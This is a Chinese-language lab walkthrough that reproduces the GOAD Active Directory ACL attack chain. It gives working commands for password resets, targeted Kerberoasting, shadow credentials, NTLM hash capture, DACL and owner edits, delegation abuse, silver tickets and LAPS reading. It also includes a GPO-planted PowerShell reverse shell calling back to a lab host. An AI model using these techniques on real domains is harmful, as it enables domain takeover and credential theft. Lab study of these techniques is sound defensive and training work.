# 前言

第一次写文章，不足之处，多多担待.

也是简单的复现了靶场了

本次环境是GOAD的ACL环境

[Orange-Cyberdefense/GOAD: game of active directory (github.com)](https:/

![image-20230610161318164](https://image.3001.net/images/20230610/1686398720_648467005a17e76edc7aa.png!small)

首先，我们将从 **tywin.lannister（密码：powerkingftw135）** 开始关注 ACL 的 sevenkingdoms 杀戮链

  * The path here is :

这里的路径是：

用户和用户

Tywin -> Jaime : 更改密码用户

Jaime -> Joffrey：通用写入用户 Joffrey -> Tyron ：用户 WriteDacl

用户和组

Tyron -> small council : 在组中添加成员

组和组

Small council -> dragon stone : 将所有者组写入组 dragonstone -> kingsguard : 将所有者写入组

组和用户

kingsguard -> stannis : Generic all on User

用户和计算机

stannis -> kingslanding : 计算机上的通用

  

GPO abuse

Read Laps password

# Tywin -> Jaime : 更改密码用户

![image-20230610162135102](https://image.3001.net/images/20230610/1686398721_648467014d4f295a866f7.png!small)

这里tywin对jaime有强制更改密码的权限

听说不可能有这个权限-.-
  

更改密码为Qwer123！

net rpc password jaime.lannister -U
sevenkingdoms.local/tywin.lannister%powerkingftw135 -S
kingslanding.sevenkingdoms.local

crackmapexec smb 192.168.56.10 -u jaime.lannister -d sevenkingdoms.local -p
Qwer123!

![image-20230610161950357](https://image.3001.net/images/20230610/1686398722_648467020d66aa9372069.png!small)

  

  

  

  

# Jaime -> Joffrey：通用写入用户

![image-20230610162351806](https://image.3001.net/images/20230610/1686398722_64846702c89725a8b7bf4.png!small)

  

有 jaime 密码，我们现在将利用从 Jaime 到 Joffrey 的 GenericWrite

这可能会滥用 3 种不同的技术：

shadowCredentials（windows server 2016 或 +） targetKerberoasting（密码应该足够弱以被破解）
logonScript（这需要一个用户连接，老实说它从来没有工作过，或者除非使用已经在 sysvol 中的脚本）

  

### Target Kerberoasting 目标 Kerberoasting

  * 首先让我们做一个目标 Kerberoasting，原理很简单。向用户添加 SPN，请求 tgs，删除用户的 SPN。

  * 现在我们可以像经典的 kerberoasting 一样破解 TGS。

  * Shutdown 有一个工具可以为您完成所有工作：<https://github.com/ShutdownRepo/targetedKerberoast>

  

targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p Qwer123！
--request-user joffrey.baratheon

![image-20230610163016014](https://image.3001.net/images/20230610/1686398723_648467039264f4f70348a.png!small)

    
    
    hashcat -m 13100 -a 0 joffrey.hash rockyou.txt --force

![image-20230610163632766](https://image.3001.net/images/20230610/1686398724_64846704bdee9b36adb4d.png!small)

  

获得joffey的密码

### 影子凭证

可以使用certipy获得joffrey的TGT以及hash

certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p
'pasdebraspasdechocolat' -account 'joffrey.baratheon'

![image-20230610164346632](https://image.3001.net/images/20230610/1686398725_64846705e932b286e0480.png!small)

  

### Logon script

    
    
    ldeep ldap -u jaime.lannister -p 'Qwer123!' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=joffrey.baratheon)' scriptpath

![image-20230610165116244](https://image.3001.net/images/20230610/1686398726_64846706e809972e16239.png!small)

作者说这个行不通

滥用 GenericWrite 的另一种方法是更改 profilePath 并等待连接以获得 NetNtlmv2 身份验证并中继到另一台计算机或破解它。

    
    
    #teat.py  
    import ldap3  
    dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local"  
    user = "sevenkingdoms.local\\jaime.lannister"  
    password = "Qwer123!"  
    server = ldap3.Server('kingslanding.sevenkingdoms.local')  
    ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)  
    ldap_con.bind()  
    ldap_con.modify(dn,{'profilePath' : [(ldap3.MODIFY_REPLACE, '\\\\192.168.56.2\share')]})  
    print(ldap_con.result)  
    ldap_con.unbind()  
    ​

![image-20230610170004277](https://image.3001.net/images/20230610/1686398727_64846707c83caa1db2d6e.png!small)

通过启动 RDP 连接启动响应器并模拟 joffrey 连接 来中继获得 joffrey.baratheon 和kingslanding$ 的
NetNLMV2 哈希值！

    
    
    responder -I eth1  
    xfreerdp /d:sevenkingdoms.local /u:joffrey.baratheon /p:'1killerlion' /v:192.168.56.10 /size:80%  /cert-ignore

![image-20230610165626858](https://image.3001.net/images/20230610/1686398728_64846708922a44ffe057d.png!small)

  

  

  

# Joffrey -> Tyron ：用户 WriteDacl

![image-20230610162246794](https://image.3001.net/images/20230610/1686398729_648467097db21fbb22b27.png!small)

要利用从 Joffrey 到 Tyron 的 writeDacl，我们可以使用 dacledit.py

  * 首先，我们将克隆由 shutdown (@_nwodtuhs) 创建的 impacket 的 fork，以使用 dacledit 获取最后的 PR

    
    
    git clone https://github.com/ThePorgs/impacket.git   
    cd impacket    
    python3 setup.py install 

首先让我们看看Joffrey对tyron的权限：

dacledit.py -action 'read' -principal joffrey.baratheon -target
'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'

![image-20230610170624849](https://image.3001.net/images/20230610/1686398730_6484670a5fa281b0bb70a.png!small)

Joffrey对tyron有writeDACl的权限

    
    
    dacledit.py -action 'write' -rights 'FullControl' -principal joffrey.baratheon  -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'

  

![image-20230610171103592](https://image.3001.net/images/20230610/1686398731_6484670b8fce592835e3c.png!small)

写入一条 fullcontrol权限

好的，现在我们可以： 更改tyron密码

net rpc password tyron.lannister -U
sevenkingdoms.local/joffrey.baratheon%1killerlion -S
kingslanding.sevenkingdoms.local

![image-20230610171612876](https://image.3001.net/images/20230610/1686398732_6484670ceab2e5eac09e5.png!small)

做一个目标target kerberoasting

python targetedKerberoast.py -v -d sevenkingdoms.local -u joffrey.baratheon -p
'1killerlion' --request-user 'tyron.lannister'

![image-20230610172156340](https://image.3001.net/images/20230610/1686398733_6484670de2d4a366daf02.png!small)

hashcat -m 13100 -a 0 tyron.hash pass.txt --force

![image-20230610172252521](https://image.3001.net/images/20230610/1686398735_6484670f3ff3026724076.png!small)

做一个影子凭据

    
    
    certipy shadow auto -u c@sevenkingdoms.local -p '1killerlion' -account 'tyron.lannister'

![image-20230610171737286](https://image.3001.net/images/20230610/1686398736_64846710549efff35ad58.png!small)

# Tyron -> small council : 在组中添加成员

![image-20230610173034442](https://image.3001.net/images/20230610/1686398737_6484671134c31bc81c491.png!small)

添加成员需要用户和组的distinguishedName

    
    
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=tyron.lannister)' distinguishedName  
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=Small Council)' distinguishedName

![image-20230610173348723](https://image.3001.net/images/20230610/1686398738_6484671234fe21b462963.png!small)

    
    
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=Small Council,OU=Crownlands,DC=sevenkingdoms,DC=local"

![image-20230610173455736](https://image.3001.net/images/20230610/1686398739_6484671340af42a62573f.png!small)

ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d
sevenkingdoms.local -s ldap://192.168.56.10 membersof 'Small Council'

![image-20230610173526136](https://image.3001.net/images/20230610/1686398740_648467143625195d580e4.png!small)

添加成功

  

  

  

# Small council -> dragon stone : 将所有者组写入组

![image-20230610173834517](https://image.3001.net/images/20230610/1686398741_6484671558373e021b616.png!small)

  

现在作为 tyron，我们在Small council中，所以我们可以添加一个成员到 dragonstone 的组中。 所以我们像以前一样添加 tyron

    
    
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"  
    ​  
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 membersof 'DragonStone' 

![image-20230610174028564](https://image.3001.net/images/20230610/1686398742_6484671617be1cd68fb52.png!small)

  

# dragonstone -> kingsguard : 将所有者写入组

![image-20230610174242476](https://image.3001.net/images/20230610/1686398743_648467172135659be2e9b.png!small)

    
    
    注意:使用上面的impacket的环境  
    ​  
    owneredit.py -action write -owner 'tyron.lannister' -target 'kingsguard' -hashes ':dc74e4b573eb79b4c4e24b00101fc1a1' sevenkingdoms.local/tyron.lannister  
    owneredit.py -action read -target 'kingsguard' -hashes ':dc74e4b573eb79b4c4e24b00101fc1a1' sevenkingdoms.local/tyron.lannister

![image-20230610175204779](https://image.3001.net/images/20230610/1686398743_64846717de3a207dbeb71.png!small)

  

  

现在 kingsguard group的owner是tyron.lannister

作为组的所有者，我们现在可以更改 acl 并在组中为我们提供 GenericAll

    
    
    dacledit.py -action 'write' -rights 'FullControl' -principal tyron.lannister  -target 'kingsguard' 'sevenkingdoms.local'/'tyron.lannister' -hashes ':dc74e4b573eb79b4c4e24b00101fc1a1'

![image-20230610180937458](https://image.3001.net/images/20230610/1686398744_64846718c67732c5d9ee2.png!small)

使用 GenericAll 现在我们可以将 tyron 添加到 kingsguard 组上面只是kingsguard 组的拥有者tyron不在组内

    
    
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=kingsguard,OU=Crownlands,DC=sevenkingdoms,DC=local"  
    ldeep ldap -u tyron.lannister -H ':dc74e4b573eb79b4c4e24b00101fc1a1' -d sevenkingdoms.local -s ldap://192.168.56.10 membersof 'kingsguard'  
    ​

![image-20230610182301330](https://image.3001.net/images/20230610/1686398745_64846719bc4776f4db3bf.png!small)

  

  

  

  

# kingsguard -> stannis : Generic all on User

  

![image-20230610180656426](https://image.3001.net/images/20230610/1686398746_6484671aacfad8cc4b7ea.png!small)

  

拥有genericall，可以直接更改密码

    
    
    net rpc password stannis.baratheon --pw-nt-hash -U sevenkingdoms.local/tyron.lannister%dc74e4b573eb79b4c4e24b00101fc1a1 -S kingslanding.sevenkingdoms.local  
    crackmapexec  smb 192.168.56.10 -u stannis.baratheon -d sevenkingdoms.local -p Qwer123! 

![image-20230610182645595](https://image.3001.net/images/20230610/1686398747_6484671b79d2ad715b455.png!small)

  

  

  

# stannis -> kingslanding : 计算机上的通用

![image-20230610182752628](https://image.3001.net/images/20230610/1686398748_6484671c965bd77928ffd.png!small)

#### 资源的约束委派

滥用此权限的一种方法是使用基于资源的约束委派

    
    
    创建计算机 X (rbcd$)  
    addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Qwer123!'  
    添加委托从 X (rbcd$) 写入我们的目标  
    rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Qwer123!

![image-20230610183355495](https://image.3001.net/images/20230610/1686398749_6484671d67d3a69eff890.png!small)

  

  

    
    
    现在 X (rbcd$) 获得了对我们目标的委托许可，您现在可以执行 s4u2self 查询，然后执行 S4u2proxy  
    getST.py -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'  
    ​  
    export KRB5CCNAME=/workspace/rbcd/Administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache  
    wmiexec.py -k -no-pass @kingslanding.sevenkingdoms.local

![image-20230610183649656](https://image.3001.net/images/20230610/1686398750_6484671e53ed6e3f05a3b.png!small)

  

    
    
    rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'flush' sevenkingdoms.local/stannis.baratheon:Qwer123!  
    addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/cersei.lannister:il0vejaime' -delete

### 影子凭证

另外一种是影子凭证

    
    
    certipy shadow auto -u stannis.baratheon@sevenkingdoms.local -p 'Qwer123!' -account 'kingslanding$'

![image-20230610182953308](https://image.3001.net/images/20230610/1686398751_6484671f4eb55b9eb06ad.png!small)

  

现在我们得到了 kingslanding$ 的 tgt 和 NT 哈希

显然我们可以做一个 dcsync 因为 kingslanding 是一个 DC，但是我们尝试直接获取一个 shell

要做到这一点，最简单的方法是使用 s4u2self abuse 或创建一张银票

#### s4u2self abuse

    
    
    export KRB5CCNAME=kingslanding.ccache  
    getST.py -self -impersonate "Administrator" -altservice "cifs/kingslanding.sevenkingdoms.local" -k -no-pass -dc-ip 192.168.56.10 "sevenkingdoms.local"/'kingslanding$'

![image-20230610184510021](https://image.3001.net/images/20230610/1686398752_648467207e7751620e256.png!small)

    
    
    export KRB5CCNAME=Administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache  
    ​  
    wmiexec.py -k -no-pass sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local

![image-20230610184850048](https://image.3001.net/images/20230610/1686398753_6484672169ff54325de60.png!small)

#### 银票

查找域 SID：

    
    
    lookupsid.py -hashes ':8dc883110158b424957d747ea0d2cae1' 'sevenkingdoms.local'/'kingslanding$'@kingslanding.sevenkingdoms.local 0

![image-20230610185053107](https://image.3001.net/images/20230610/1686398754_6484672248b859841a173.png!small)

    
    
    ticketer.py -nthash '8dc883110158b424957d747ea0d2cae1' -domain-sid 'S-1-5-21-3621576433-799811104-949646468' -domain sevenkingdoms.local -spn cifs/kingslanding.sevenkingdoms.local Administrator  
    export KRB5CCNAME=Administrator.ccache  
    wmiexec.py -k -no-pass sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local

![image-20230610185351772](https://image.3001.net/images/20230610/1686398755_648467235b7deb686fc0c.png!small)

  

  

# GPO abuse

  

![image-20230610190013619](https://image.3001.net/images/20230610/1686398756_6484672469557d39be06b.png!small)

在north域存在 GPO abuse

![image-20230610191932087](https://image.3001.net/images/20230610/1686398757_6484672528b7087ac6f87.png!small)

gpofilepath 知道gpoid

    
    
    python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "40EB1D54-F395-4B16-ACE2-6F127D0B82B9" -powershell -command "\$c = New-Object System.Net.Sockets.TCPClient('192.168.56.2',4444);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){    \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);    \$sb = (iex \$d 2>&1 | Out-String );    \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps> ');    \$s.Write(\$sb,0,\$sb.Length);    \$s.Flush()};\$c.Close()" -taskname "abuse_gpo" -f -description "don't worry"  
    [+] ScheduledTask abuse_gpo created!

  

![image-20230610192742127](https://image.3001.net/images/20230610/1686398758_64846726235d1602aa373.png!small)

  

![image-20230610192944911](https://image.3001.net/images/20230610/1686398759_648467272eeb0ee5328ef.png!small)

  

#  **Read Laps password**

![image-20230610193901249](https://image.3001.net/images/20230610/1686398760_648467280bd90db26e5aa.png!small)

    
    
    crackmapexec  ldap 192.168.56.12 -d essos.local -u jorah.mormont -p 'H0nnor!' --module laps

![image-20230610200043983](https://image.3001.net/images/20230610/1686398760_64846728bb63b2d4ea04c.png!small)

REF:

[GOAD - part 11 - ACL | Mayfly --- GOAD - 第 11 部分 - ACL |蜉蝣
(mayfly277.github.io)](https://mayfly277.github.io/posts/GOADv2-pwning-part11/#add-self-on-group-tyron---small-council)

[域渗透GOAD(Game Of Active Directory) v2（三） - 先知社区
(aliyun.com)](https://xz.aliyun.com/t/12139#toc-53)

